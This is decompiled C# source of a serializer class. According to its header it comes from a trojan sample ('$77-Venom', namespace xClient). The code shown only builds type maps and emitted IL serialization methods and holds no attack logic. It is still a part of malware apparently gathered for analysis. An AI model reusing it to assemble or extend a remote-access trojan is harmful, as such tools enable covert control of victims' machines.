// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.Serializer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using xClient.Core.NetSerializer.TypeSerializers;

namespace xClient.Core.NetSerializer
{
  public class Serializer
  {
    private Dictionary<Type, ushort> m_typeIDMap;
    private Serializer.SerializerSwitch m_serializerSwitch;
    private Serializer.DeserializerSwitch m_deserializerSwitch;
    private static ITypeSerializer[] s_typeSerializers = new ITypeSerializer[6]
    {
      (ITypeSerializer) new ObjectSerializer(),
      (ITypeSerializer) new PrimitivesSerializer(),
      (ITypeSerializer) new ArraySerializer(),
      (ITypeSerializer) new EnumSerializer(),
      (ITypeSerializer) new DictionarySerializer(),
      (ITypeSerializer) new GenericSerializer()
    };
    private ITypeSerializer[] m_userTypeSerializers;

    public Serializer(IEnumerable<Type> rootTypes)
      : this(rootTypes, new ITypeSerializer[0])
    {
    }

    public Serializer(IEnumerable<Type> rootTypes, ITypeSerializer[] userTypeSerializers)
    {
      this.m_userTypeSerializers = ((IEnumerable<ITypeSerializer>) userTypeSerializers).All<ITypeSerializer>((Func<ITypeSerializer, bool>) (s => s is IDynamicTypeSerializer || s is IStaticTypeSerializer)) ? userTypeSerializers : throw new ArgumentException("TypeSerializers have to implement IDynamicTypeSerializer or  IStaticTypeSerializer");
      Dictionary<Type, TypeData> typeData = this.GenerateTypeData(rootTypes);
      this.GenerateDynamic(typeData);
      this.m_typeIDMap = typeData.ToDictionary<KeyValuePair<Type, TypeData>, Type, ushort>((Func<KeyValuePair<Type, TypeData>, Type>) (kvp => kvp.Key), (Func<KeyValuePair<Type, TypeData>, ushort>) (kvp => kvp.Value.TypeID));
    }

    public void Serialize(Stream stream, object data) => this.m_serializerSwitch(this, stream, data);

    public object Deserialize(Stream stream)
    {
      object ob;
      this.m_deserializerSwitch(this, stream, out ob);
      return ob;
    }

    private Dictionary<Type, TypeData> GenerateTypeData(
      IEnumerable<Type> rootTypes)
    {
      Dictionary<Type, TypeData> typeData1 = new Dictionary<Type, TypeData>();
      Stack<Type> typeStack = new Stack<Type>(PrimitivesSerializer.GetSupportedTypes().Concat<Type>(rootTypes));
      typeStack.Push(typeof (object));
      ushort num = 1;
      while (typeStack.Count > 0)
      {
        Type type = typeStack.Pop();
        if (!typeData1.ContainsKey(type) && !type.IsAbstract && !type.IsInterface)
        {
          if (type.ContainsGenericParameters)
            throw new NotSupportedException(string.Format("Type {0} contains generic parameters", (object) type.FullName));
          ITypeSerializer typeSerializer = ((IEnumerable<ITypeSerializer>) this.m_userTypeSerializers).FirstOrDefault<ITypeSerializer>((Func<ITypeSerializer, bool>) (h => h.Handles(type))) ?? ((IEnumerable<ITypeSerializer>) Serializer.s_typeSerializers).FirstOrDefault<ITypeSerializer>((Func<ITypeSerializer, bool>) (h => h.Handles(type)));
          if (typeSerializer == null)
            throw new NotSupportedException(string.Format("No serializer for {0}", (object) type.FullName));
          foreach (Type subtype in typeSerializer.GetSubtypes(type))
            typeStack.Push(subtype);
          TypeData typeData2;
          switch (typeSerializer)
          {
            case IStaticTypeSerializer _:
              MethodInfo writer;
              MethodInfo reader;
              ((IStaticTypeSerializer) typeSerializer).GetStaticMethods(type, out writer, out reader);
              typeData2 = new TypeData(num++, writer, reader);
              break;
            case IDynamicTypeSerializer _:
              IDynamicTypeSerializer serializer = (IDynamicTypeSerializer) typeSerializer;
              typeData2 = new TypeData(num++, serializer);
              break;
            default:
              throw new Exception();
          }
          typeData1[type] = typeData2;
        }
      }
      return typeData1;
    }

    private void GenerateDynamic(Dictionary<Type, TypeData> map)
    {
      foreach (KeyValuePair<Type, TypeData> keyValuePair in map)
      {
        Type key = keyValuePair.Key;
        TypeData typeData = keyValuePair.Value;
        if (typeData.IsGenerated)
        {
          typeData.WriterMethodInfo = (MethodInfo) Helpers.GenerateDynamicSerializerStub(key);
          typeData.ReaderMethodInfo = (MethodInfo) Helpers.GenerateDynamicDeserializerStub(key);
        }
      }
      CodeGenContext ctx = new CodeGenContext(map);
      foreach (KeyValuePair<Type, TypeData> keyValuePair in map)
      {
        Type key = keyValuePair.Key;
        TypeData typeData = keyValuePair.Value;
        if (typeData.IsGenerated)
        {
          DynamicMethod writerMethodInfo = (DynamicMethod) typeData.WriterMethodInfo;
          typeData.TypeSerializer.GenerateWriterMethod(key, ctx, writerMethodInfo.GetILGenerator());
          DynamicMethod readerMethodInfo = (DynamicMethod) typeData.ReaderMethodInfo;
          typeData.TypeSerializer.GenerateReaderMethod(key, ctx, readerMethodInfo.GetILGenerator());
        }
      }
      DynamicMethod writerMethodInfo1 = (DynamicMethod) ctx.GetWriterMethodInfo(typeof (object));
      DynamicMethod readerMethodInfo1 = (DynamicMethod) ctx.GetReaderMethodInfo(typeof (object));
      this.m_serializerSwitch = (Serializer.SerializerSwitch) writerMethodInfo1.CreateDelegate(typeof (Serializer.SerializerSwitch));
      this.m_deserializerSwitch = (Serializer.DeserializerSwitch) readerMethodInfo1.CreateDelegate(typeof (Serializer.DeserializerSwitch));
    }

    private ushort GetTypeID(object ob)
    {
      if (ob == null)
        return 0;
      Type type = ob.GetType();
      ushort typeId;
      if (!this.m_typeIDMap.TryGetValue(type, out typeId))
        throw new InvalidOperationException(string.Format("Unknown type {0}", (object) type.FullName));
      return typeId;
    }

    private delegate void SerializerSwitch(Serializer serializer, Stream stream, object ob);

    private delegate void DeserializerSwitch(Serializer serializer, Stream stream, out object ob);
  }
}
